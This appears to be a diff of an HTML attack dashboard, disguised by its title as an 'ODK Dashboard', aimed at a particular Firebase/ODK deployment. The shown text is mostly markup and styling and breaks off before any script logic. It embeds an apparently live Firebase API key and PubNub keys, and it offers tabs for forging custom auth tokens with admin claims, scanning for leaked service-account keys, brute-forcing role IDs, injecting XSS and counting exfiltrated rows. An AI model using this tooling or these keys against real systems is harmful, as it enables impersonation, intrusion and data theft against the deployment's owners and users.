@@ -3,80 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ODK Dashboard - System Admin</title>
+    <title>ODK Dashboard - Project Manager</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #0a0a0a; color: #e0e0e0; min-height: 100vh;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
         }
         .navbar {
-            background: #111; border-bottom: 1px solid #2a2a2a;
-            padding: 12px 24px; display: flex; align-items: center; justify-content: space-between;
+            background: #111;
+            border-bottom: 1px solid #2a2a2a;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
-        .navbar-brand { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 16px; }
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 16px;
+        }
         .navbar-brand .logo {
-            width: 32px; height: 32px; background: linear-gradient(135deg, #6366f1, #8b5cf6);
-            border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 16px; color: #fff;
+            width: 32px; height: 32px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #fff;
         }
-        .navbar-user { display: none; align-items: center; gap: 10px; font-size: 13px; color: #888; }
+        .navbar-user {
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #888;
+        }
         .navbar-user.active { display: flex; }
         .navbar-user img { width: 28px; height: 28px; border-radius: 50%; }
 
         .login-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 1000;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
         }
         .login-overlay.hidden { display: none; }
         .login-box {
-            background: #141414; border: 1px solid #2a2a2a; border-radius: 16px;
-            padding: 40px; width: 100%; max-width: 400px; text-align: center;
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
         }
         .login-box h2 { font-size: 20px; margin-bottom: 6px; }
         .login-box p { color: #888; font-size: 13px; margin-bottom: 24px; }
         .btn-google {
-            width: 100%; padding: 12px; background: #fff; color: #333; border: none;
-            border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer;
-            display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.2s;
+            width: 100%;
+            padding: 12px;
+            background: #fff;
+            color: #333;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s;
         }
         .btn-google:hover { background: #f0f0f0; }
         .btn-google svg { width: 18px; height: 18px; }
         .login-loading { display: none; margin-top: 16px; color: #888; font-size: 13px; }
         .login-loading.active { display: block; }
 
-        .main { display: none; padding: 24px; max-width: 1300px; margin: 0 auto; }
+        .main { display: none; padding: 24px; max-width: 1400px; margin: 0 auto; }
         .main.active { display: block; }
 
         .tabs {
-            display: flex; gap: 4px; margin-bottom: 24px; background: #111;
-            border-radius: 10px; padding: 4px; border: 1px solid #2a2a2a; flex-wrap: wrap;
+            display: flex;
+            gap: 4px;
+            margin-bottom: 24px;
+            background: #111;
+            border-radius: 10px;
+            padding: 4px;
+            border: 1px solid #2a2a2a;
+            flex-wrap: wrap;
         }
         .tab {
-            flex: 1; min-width: 110px; padding: 10px 6px; background: transparent; color: #888;
-            border: none; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+            flex: 1;
+            min-width: 120px;
+            padding: 10px 6px;
+            background: transparent;
+            color: #888;
+            border: none;
+            border-radius: 8px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
         }
         .tab:hover { color: #ccc; }
-        .tab.active { background: linear-gradient(135deg, #6366f1, #8b5cf6); color: #fff; }
+        .tab.active {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+        }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
 
         .card {
-            background: #141414; border: 1px solid #2a2a2a; border-radius: 12px;
-            padding: 20px; margin-bottom: 16px;
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
         }
-        .card h3 { font-size: 15px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
-        .card h3 .badge { font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: 600; }
+        .card h3 {
+            font-size: 15px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .card h3 .badge {
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
         .badge-red { background: #7f1d1d; color: #fca5a5; }
         .badge-orange { background: #7c2d12; color: #fdba74; }
         .badge-green { background: #14532d; color: #86efac; }
         .badge-blue { background: #1e3a5f; color: #93c5fd; }
         .badge-purple { background: #4a1d6a; color: #d8b4fe; }
-        .badge-critical { background: #dc2626; color: #fff; }
+        .badge-yellow { background: #713f12; color: #fde047; }
 
         .console {
-            background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px; padding: 12px;
-            max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace;
-            font-size: 12px; line-height: 1.8;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.8;
         }
         .console::-webkit-scrollbar { width: 6px; }
         .console::-webkit-scrollbar-track { background: #0a0a0a; }
@@ -86,57 +169,181 @@
         .log-warning { color: #fbbf24; }
         .log-error { color: #fca5a5; }
         .log-data { color: #c4b5fd; }
+        .log-critical { color: #ff6b6b; font-weight: bold; }
 
         .btn {
-            padding: 10px 16px; border: none; border-radius: 8px; font-size: 12px;
-            font-weight: 600; cursor: pointer; transition: all 0.2s;
+            padding: 10px 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
         }
-        .btn-primary { background: linear-gradient(135deg, #6366f1, #8b5cf6); color: #fff; }
+        .btn-primary {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff;
+        }
         .btn-primary:hover { opacity: 0.9; }
         .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
-        .btn-danger { background: #7f1d1d; color: #fca5a5; }
+        .btn-danger {
+            background: #7f1d1d;
+            color: #fca5a5;
+        }
         .btn-danger:hover { background: #991b1b; }
-        .btn-outline { background: transparent; color: #888; border: 1px solid #2a2a2a; }
+        .btn-outline {
+            background: transparent;
+            color: #888;
+            border: 1px solid #2a2a2a;
+        }
         .btn-outline:hover { border-color: #555; color: #ccc; }
+        .btn-green {
+            background: #14532d;
+            color: #86efac;
+        }
+        .btn-green:hover { background: #166534; }
+        .btn-orange {
+            background: #7c2d12;
+            color: #fdba74;
+        }
+        .btn-orange:hover { background: #9a3412; }
 
         .input-group { margin-bottom: 12px; }
         .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 4px; }
         .input-group input, .input-group select, .input-group textarea {
-            width: 100%; padding: 10px; background: #0a0a0a; border: 1px solid #2a2a2a;
-            border-radius: 8px; color: #e0e0e0; font-size: 13px; outline: none;
+            width: 100%;
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 13px;
+            outline: none;
         }
-        .input-group textarea { font-family: 'Courier New', monospace; font-size: 11px; min-height: 80px; resize: vertical; }
+        .input-group textarea { font-family: 'Courier New', monospace; font-size: 11px; min-height: 100px; resize: vertical; }
         .input-group input:focus, .input-group textarea:focus { border-color: #6366f1; }
 
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 12px; margin-bottom: 16px; }
-        .stat { background: #111; border: 1px solid #2a2a2a; border-radius: 8px; padding: 14px; text-align: center; }
-        .stat-value { font-size: 24px; font-weight: 800; color: #6366f1; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .stat {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 14px;
+            text-align: center;
+        }
+        .stat-value { font-size: 24px; font-weight: 800; }
+        .stat-value.v-blue { color: #6366f1; }
+        .stat-value.v-green { color: #86efac; }
+        .stat-value.v-red { color: #fca5a5; }
+        .stat-value.v-yellow { color: #fbbf24; }
+        .stat-value.v-purple { color: #d8b4fe; }
         .stat-label { font-size: 11px; color: #888; margin-top: 4px; }
 
-        .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
+        .btn-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
 
-        .project-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 12px; }
-        .project-card {
-            background: #0a0a0a; border: 1px solid #2a2a2a; border-radius: 8px; padding: 14px;
+        .progress-bar {
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 12px;
         }
-        .project-card h4 { font-size: 13px; color: #f87171; margin-bottom: 6px; }
-        .project-card .key { font-family: 'Courier New', monospace; font-size: 10px; color: #888; word-break: break-all; }
-        .project-card .status { font-size: 11px; margin-top: 6px; }
-        .project-card .status.ok { color: #86efac; }
-        .project-card .status.warn { color: #fbbf24; }
-        .project-card .status.err { color: #fca5a5; }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6);
+            width: 0%;
+            transition: width 0.3s;
+        }
 
-        .chain-step {
-            display: flex; align-items: flex-start; gap: 12px; padding: 10px;
-            background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px; margin-bottom: 6px;
+        .key-card {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
         }
-        .chain-num {
-            background: #ef4444; color: #fff; width: 24px; height: 24px;
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-size: 11px; font-weight: 700; flex-shrink: 0;
+        .key-card:hover { border-color: #6366f1; }
+        .key-card.active { border-color: #6366f1; background: #1a1030; }
+        .key-card.found { border-color: #14532d; background: #0a1a0a; }
+        .key-card .key-name { font-size: 13px; font-weight: 600; margin-bottom: 4px; }
+        .key-card .key-value { font-family: 'Courier New', monospace; font-size: 11px; color: #888; word-break: break-all; }
+        .key-card .key-status { font-size: 11px; margin-top: 6px; }
+        .key-card .key-status.active-key { color: #86efac; }
+        .key-card .key-status.inactive-key { color: #fca5a5; }
+        .key-card .key-status.unknown-key { color: #fbbf24; }
+
+        .endpoint-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 8px;
         }
-        .chain-text { font-size: 12px; color: #cbd5e1; }
-        .chain-arrow { text-align: center; color: #ef4444; font-size: 16px; margin: -2px 0 2px 36px; }
+        .ep-result {
+            padding: 10px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            font-size: 11px;
+            font-family: 'Courier New', monospace;
+        }
+        .ep-result.ep-ok { border-color: #14532d; }
+        .ep-result.ep-fail { border-color: #7f1d1d; }
+        .ep-result.ep-warn { border-color: #7c2d12; }
+        .ep-result .ep-method { font-weight: 700; color: #93c5fd; }
+        .ep-result .ep-status { font-weight: 700; }
+        .ep-result .ep-status.s-ok { color: #86efac; }
+        .ep-result .ep-status.s-fail { color: #fca5a5; }
+        .ep-result .ep-status.s-warn { color: #fdba74; }
+        .ep-result .ep-body { color: #c4b5fd; margin-top: 6px; word-break: break-all; }
+
+        .jwt-viewer {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            line-height: 1.8;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .jwt-field { color: #fbbf24; }
+        .jwt-value { color: #86efac; }
+        .jwt-warn { color: #fca5a5; }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        @media (max-width: 768px) {
+            .grid-2 { grid-template-columns: 1fr; }
+        }
+
+        .alert-box {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+        .alert-critical { background: #2d0a0a; border: 1px solid #7f1d1d; color: #fca5a5; }
+        .alert-warning { background: #2d1a0a; border: 1px solid #7c2d12; color: #fdba74; }
+        .alert-info { background: #0a1a2d; border: 1px solid #1e3a5f; color: #93c5fd; }
+        .alert-success { background: #0a2d1a; border: 1px solid #14532d; color: #86efac; }
     </style>
 </head>
 <body>
@@ -166,181 +373,269 @@
 
     <div class="main" id="mainContent">
         <div class="stats">
-            <div class="stat"><div class="stat-value" id="statProjects">3</div><div class="stat-label">Firebase Projects</div></div>
-            <div class="stat"><div class="stat-value" id="statKeys">0</div><div class="stat-label">Keys Found</div></div>
-            <div class="stat"><div class="stat-value" id="statTokens">0</div><div class="stat-label">Tokens Obtained</div></div>
-            <div class="stat"><div class="stat-value" id="statExfil">0</div><div class="stat-label">Rows Exfiltrated</div></div>
+            <div class="stat">
+                <div class="stat-value v-blue" id="statEndpoints">0</div>
+                <div class="stat-label">Endpoints Tested</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-green" id="statVulns">0</div>
+                <div class="stat-label">Vulns Found</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-red" id="statCritical">0</div>
+                <div class="stat-label">Critical</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-yellow" id="statKeys">0</div>
+                <div class="stat-label">Keys Found</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value v-purple" id="statExfil">0</div>
+                <div class="stat-label">Rows Exfiltrated</div>
+            </div>
         </div>
 
         <div class="tabs">
-            <button class="tab active" onclick="switchTab('identity')">Identity Toolkit</button>
-            <button class="tab" onclick="switchTab('guest')">Guest Token</button>
-            <button class="tab" onclick="switchTab('pubnub')">PubNub Monitor</button>
-            <button class="tab" onclick="switchTab('custom')">Custom Token</button>
-            <button class="tab" onclick="switchTab('admin')">Admin Routes</button>
+            <button class="tab active" onclick="switchTab('recon')">API Key Recon</button>
+            <button class="tab" onclick="switchTab('identity')">Identity Toolkit</button>
+            <button class="tab" onclick="switchTab('service')">Service Account</button>
+            <button class="tab" onclick="switchTab('custom')">Custom Token Forge</button>
+            <button class="tab" onclick="switchTab('admin')">Admin Access</button>
             <button class="tab" onclick="switchTab('results')">Results</button>
         </div>
 
-        <!-- IDENTITY TOOLKIT TAB -->
-        <div class="tab-content active" id="tab-identity">
+        <!-- ===================================================== -->
+        <!-- TAB 1: API KEY RECON -->
+        <!-- ===================================================== -->
+        <div class="tab-content active" id="tab-recon">
             <div class="card">
-                <h3>Firebase Identity Toolkit Attack <span class="badge badge-critical">CRITICAL</span></h3>
+                <h3>API Key Reconnaissance <span class="badge badge-red">Critical</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
-                    Test all 3 Firebase projects against Identity Toolkit endpoints. The API key <b>AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis</b> is confirmed active (returns ADMIN_ONLY_OPERATION on signUp). Try signInWithCustomToken, signInWithIdp, createAuthUri, and more.
+                    Discover and test Firebase API keys. If the API key grants access to Identity Toolkit with admin operations, an attacker can forge custom tokens and impersonate any user.
                 </p>
-                <div class="project-grid" id="projectGrid"></div>
-                <div class="btn-row" style="margin-top:16px;">
-                    <button class="btn btn-primary" onclick="runIdentityToolkitAttack()">Run All Identity Toolkit Tests</button>
-                    <button class="btn btn-outline" onclick="testSignUp()">Test signUp Endpoint</button>
+                <div class="alert-box alert-critical">
+                    <strong>Attack Vector:</strong> Firebase API key <code>AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis</code> is confirmed ACTIVE. The <code>signUp</code> endpoint returns <code>ADMIN_ONLY_OPERATION</code>, which means the key works but signup is restricted to admin-created users. If a Service Account key is also leaked, full authentication bypass is possible.
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="runAPIKeyRecon()">Run Full Recon</button>
+                    <button class="btn btn-outline" onclick="testAllIdentityEndpoints()">Test Identity Toolkit Endpoints</button>
+                    <button class="btn btn-outline" onclick="discoverAPIKeys()">Discover API Keys from Source</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="reconProgress"></div></div>
+                <div class="console" id="reconLog">
+                    <div class="log-info">[RECON] Ready. Click "Run Full Recon" to start API key discovery and testing.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Discovered API Keys <span class="badge badge-green">Found</span></h3>
+                <div id="apiKeysList">
+                    <div style="color:#888;font-size:12px;">Run recon to discover API keys.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Custom API Key Test <span class="badge badge-blue">Manual</span></h3>
+                <div class="input-group">
+                    <label>API Key to test:</label>
+                    <input type="text" id="customApiKey" value="AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis" placeholder="AIzaSy...">
+                </div>
+                <div class="input-group">
+                    <label>Endpoint to test:</label>
+                    <select id="apiKeyEndpoint">
+                        <option value="signUp">accounts:signUp</option>
+                        <option value="signInWithPassword">accounts:signInWithPassword</option>
+                        <option value="signInWithCustomToken">accounts:signInWithCustomToken</option>
+                        <option value="sendOobCode">accounts:sendOobCode</option>
+                        <option value="resetPassword">accounts:resetPassword</option>
+                        <option value="update">accounts:update</option>
+                        <option value="lookup">accounts:lookup</option>
+                        <option value="delete">accounts:delete</option>
+                        <option value="createAuthUri">accounts:createAuthUri</option>
+                        <option value="issueSamlRequest">accounts:issueSamlRequest</option>
+                    </select>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testCustomApiKey()">Test Endpoint</button>
+                    <button class="btn btn-green" onclick="testAllEndpointsForKey()">Test ALL Endpoints</button>
+                </div>
+                <div class="console" id="apiKeyTestLog">
+                    <div class="log-info">[KEY TEST] Ready to test custom API key.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===================================================== -->
+        <!-- TAB 2: IDENTITY TOOLKIT -->
+        <!-- ===================================================== -->
+        <div class="tab-content" id="tab-identity">
+            <div class="card">
+                <h3>Identity Toolkit API Testing <span class="badge badge-red">Critical</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Test Firebase Identity Toolkit endpoints for misconfigurations. The key insight: <code>ADMIN_ONLY_OPERATION</code> on signUp means the API key is valid and connected to a real Firebase project with admin-only operations enabled.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testIdentityToolkit()">Test All Identity Toolkit APIs</button>
+                    <button class="btn btn-outline" onclick="testSignUp()">Test signUp</button>
+                    <button class="btn btn-outline" onclick="testSignInWithPassword()">Test signInWithPassword</button>
                     <button class="btn btn-outline" onclick="testSignInWithCustomToken()">Test signInWithCustomToken</button>
-                    <button class="btn btn-outline" onclick="testSignInWithIdp()">Test signInWithIdp</button>
+                    <button class="btn btn-outline" onclick="testSendOobCode()">Test sendOobCode (Password Reset)</button>
                     <button class="btn btn-outline" onclick="testCreateAuthUri()">Test createAuthUri</button>
-                    <button class="btn btn-danger" onclick="testAllEndpoints()">Brute-Force All Endpoints</button>
                 </div>
-            </div>
-            <div class="card">
-                <h3>Attack Chain <span class="badge badge-red">Flow</span></h3>
-                <div class="chain-step"><div class="chain-num">1</div><div class="chain-text">Test signUp → ADMIN_ONLY_OPERATION confirms API key is active</div></div>
-                <div class="chain-arrow">&#9660;</div>
-                <div class="chain-step"><div class="chain-num">2</div><div class="chain-text">If Service Account Key leaks → mint Custom Tokens for any user (including admin)</div></div>
-                <div class="chain-arrow">&#9660;</div>
-                <div class="chain-step"><div class="chain-num">3</div><div class="chain-text">signInWithCustomToken → full auth as target user → admin access to ODK API</div></div>
-                <div class="chain-arrow">&#9660;</div>
-                <div class="chain-step"><div class="chain-num">4</div><div class="chain-text">With admin token → write to all endpoints → Stored XSS → steal all admin data</div></div>
-            </div>
-            <div class="card">
-                <h3>Identity Toolkit Log</h3>
+                <div class="progress-bar"><div class="progress-fill" id="identityProgress"></div></div>
                 <div class="console" id="identityLog">
-                    <div class="log-info">[IDENTITY] Ready. Click "Run All Identity Toolkit Tests" to start.</div>
+                    <div class="log-info">[IDENTITY] Ready to test Identity Toolkit endpoints.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Endpoint Results <span class="badge badge-green">Results</span></h3>
+                <div class="endpoint-grid" id="identityResults">
+                    <div style="color:#888;font-size:12px;">Run Identity Toolkit tests to see results.</div>
                 </div>
             </div>
         </div>
 
-        <!-- GUEST TOKEN TAB -->
-        <div class="tab-content" id="tab-guest">
+        <!-- ===================================================== -->
+        <!-- TAB 3: SERVICE ACCOUNT -->
+        <!-- ===================================================== -->
+        <div class="tab-content" id="tab-service">
             <div class="card">
-                <h3>Guest Token Escalation <span class="badge badge-critical">CRITICAL</span></h3>
+                <h3>Service Account Key Discovery <span class="badge badge-red">Critical</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
-                    <b>Confirmed path:</b> GET /organizations/current (no auth) exposes PubNub keys + allowUserTokenManagement:true. With any Bearer Token, try POST /permissions/guest/{roleId} to get Guest JWT with elevated permissions. Guest token grants access to /dashboard/guest/[token].
+                    If a Firebase Service Account key is leaked (via exposed .json files, API endpoints, or misconfigured storage), an attacker can create Custom Auth Tokens for ANY user including admins. This bypasses all permission checks.
                 </p>
-                <div class="btn-row">
-                    <button class="btn btn-primary" onclick="runGuestTokenAttack()">Run Guest Token Attack</button>
-                    <button class="btn btn-outline" onclick="fetchOrgInfo()">Fetch Org Info (No Auth)</button>
-                    <button class="btn btn-outline" onclick="listRoles()">List Roles</button>
-                    <button class="btn btn-outline" onclick="tryGuestTokenCreate()">Create Guest Token</button>
-                    <button class="btn btn-danger" onclick="bruteForceRoles()">Brute-Force Role IDs</button>
-                </div>
-            </div>
-            <div class="card">
-                <h3>Org Info (Unauthenticated) <span class="badge badge-green">200 OK</span></h3>
-                <div class="console" id="orgInfoLog">
-                    <div class="log-info">[ORG] Click "Fetch Org Info" to get PubNub keys and settings.</div>
-                </div>
-            </div>
-            <div class="card">
-                <h3>Guest Token Log</h3>
-                <div class="console" id="guestLog">
-                    <div class="log-info">[GUEST] Ready. Authenticate first, then run Guest Token Attack.</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- PUBNUB TAB -->
-        <div class="tab-content" id="tab-pubnub">
-            <div class="card">
-                <h3>PubNub Real-Time Monitor <span class="badge badge-orange">HIGH</span></h3>
-                <p style="color:#888;font-size:12px;margin-bottom:12px;">
-                    PubNub keys exposed without authentication via GET /organizations/current. Use these to monitor real-time events, inject messages into live sessions, and hijack user sessions.
-                </p>
-                <div class="input-group">
-                    <label>Publish Key:</label>
-                    <input type="text" id="pubnubPubKey" value="pub-c-0b70dc8a-e642-440c-8012-93a986cdd7a2">
-                </div>
-                <div class="input-group">
-                    <label>Subscribe Key:</label>
-                    <input type="text" id="pubnubSubKey" value="sub-c-0a731161-a567-46b7-bdf7-4dcb6e0749ab">
-                </div>
-                <div class="input-group">
-                    <label>Channel Name:</label>
-                    <input type="text" id="pubnubChannel" value="otherside_world">
+                <div class="alert-box alert-warning">
+                    <strong>How it works:</strong> Service Account private key + <code>firebase-admin</code> SDK = ability to mint Custom Tokens with arbitrary UID. These tokens are then exchanged for real ID tokens via <code>signInWithCustomToken</code>. The resulting ID token has full authentication as the specified user.
                 </div>
                 <div class="btn-row">
-                    <button class="btn btn-primary" onclick="initPubNub()">Initialize PubNub + Subscribe</button>
-                    <button class="btn btn-outline" onclick="pubNubPublish()">Publish Test Message</button>
-                    <button class="btn btn-outline" onclick="pubNubHereNow()">Here Now (Online Users)</button>
-                    <button class="btn btn-danger" onclick="pubNubInjectXSS()">Inject XSS via PubNub</button>
+                    <button class="btn btn-primary" onclick="scanForServiceAccountKeys()">Scan for Service Account Keys</button>
+                    <button class="btn btn-outline" onclick="testKnownSAPaths()">Test Known SA File Paths</button>
+                    <button class="btn btn-outline" onclick="checkFirebaseConfig()">Check Firebase Config Endpoint</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="saProgress"></div></div>
+                <div class="console" id="saLog">
+                    <div class="log-info">[SA] Ready to scan for Service Account keys.</div>
                 </div>
             </div>
+
             <div class="card">
-                <h3>PubNub Event Log</h3>
-                <div class="console" id="pubnubLog" style="max-height:400px;">
-                    <div class="log-info">[PUBNUB] Ready. Click "Initialize PubNub" to start monitoring.</div>
+                <h3>Manual Service Account Input <span class="badge badge-orange">Manual</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    If you have obtained a Service Account JSON key (from another source), paste it here to create Custom Tokens.
+                </p>
+                <div class="input-group">
+                    <label>Service Account JSON Key:</label>
+                    <textarea id="saJsonInput" placeholder='{"type":"service_account","project_id":"...","private_key_id":"...","private_key":"-----BEGIN PRIVATE KEY-----...","client_email":"...@...iam.gserviceaccount.com",...}'></textarea>
+                </div>
+                <div class="input-group">
+                    <label>Target UID to impersonate:</label>
+                    <input type="text" id="saTargetUid" placeholder="UID of user to impersonate (leave empty for admin)">
+                </div>
+                <div class="input-group">
+                    <label>Custom claims to inject (JSON):</label>
+                    <input type="text" id="saCustomClaims" value='{"admin": true}' placeholder='{"admin": true}'>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-danger" onclick="createCustomTokenFromSA()">Create Custom Token from SA</button>
+                    <button class="btn btn-outline" onclick="validateSAKey()">Validate SA Key Format</button>
                 </div>
             </div>
         </div>
 
-        <!-- CUSTOM TOKEN TAB -->
+        <!-- ===================================================== -->
+        <!-- TAB 4: CUSTOM TOKEN FORGE -->
+        <!-- ===================================================== -->
         <div class="tab-content" id="tab-custom">
             <div class="card">
-                <h3>Custom Token Forge <span class="badge badge-purple">JWT</span></h3>
+                <h3>Custom Token Forge <span class="badge badge-red">Critical</span></h3>
                 <p style="color:#888;font-size:12px;margin-bottom:12px;">
-                    If you obtain a Service Account Key (JSON), paste it below to mint Custom Tokens. These tokens grant full authentication as any user specified by UID. With CORS * on all endpoints, this works from any website.
+                    Forge Custom Auth Tokens and exchange them for real Firebase ID tokens. This requires either a Service Account key or an existing custom token.
                 </p>
-                <div class="input-group">
-                    <label>Service Account Key (JSON):</label>
-                    <textarea id="serviceAccountKey" placeholder='Paste the full service account JSON key here...' style="min-height:120px;"></textarea>
-                </div>
-                <div class="input-group">
-                    <label>Target User UID to impersonate:</label>
-                    <input type="text" id="targetUid" placeholder="e.g. admin UID or leave empty for new user">
-                </div>
-                <div class="input-group">
-                    <label>Custom Claims to inject:</label>
-                    <textarea id="customClaims" placeholder='{"admin": true, "role": "owner"}' style="min-height:60px;"></textarea>
-                </div>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="forgeCustomToken()">Forge Custom Token</button>
-                    <button class="btn btn-outline" onclick="testStolenKey()">Test Stolen Key (paste above)</button>
+                    <button class="btn btn-outline" onclick="exchangeCustomToken()">Exchange Token for ID Token</button>
+                    <button class="btn btn-green" onclick="testForgedToken()">Test Forged Token on ODK</button>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="forgeProgress"></div></div>
+                <div class="console" id="forgeLog">
+                    <div class="log-info">[FORGE] Ready. Enter a custom token or use Service Account to forge one.</div>
                 </div>
             </div>
-            <div class="card">
-                <h3>Token Forge Log</h3>
-                <div class="console" id="customLog">
-                    <div class="log-info">[FORGE] Ready. Paste a Service Account Key JSON to mint custom tokens.</div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h3>Custom Token Input <span class="badge badge-blue">Input</span></h3>
+                    <div class="input-group">
+                        <label>Custom Token (paste if obtained externally):</label>
+                        <textarea id="customTokenInput" placeholder="Paste a Firebase Custom Token here..."></textarea>
+                    </div>
+                    <div class="input-group">
+                        <label>Or specify UID to forge:</label>
+                        <input type="text" id="forgeTargetUid" placeholder="Target UID to impersonate">
+                    </div>
+                    <div class="input-group">
+                        <label>API Key for token exchange:</label>
+                        <input type="text" id="forgeApiKey" value="AIzaSyCB5Y3pwcctj-d9CkW2UGEzrExsXZFScis">
+                    </div>
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="exchangeProvidedToken()">Exchange Custom Token</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Forged Token Result <span class="badge badge-green">Output</span></h3>
+                    <div class="jwt-viewer" id="forgeResult">
+                        <span style="color:#888;">[FORGE] Results will appear here after token forging.</span>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- ADMIN ROUTES TAB -->
+        <!-- ===================================================== -->
+        <!-- TAB 5: ADMIN ACCESS -->
+        <!-- ===================================================== -->
         <div class="tab-content" id="tab-admin">
             <div class="card">
-                <h3>ODK Admin Routes <span class="badge badge-red">18 Routes</span></h3>
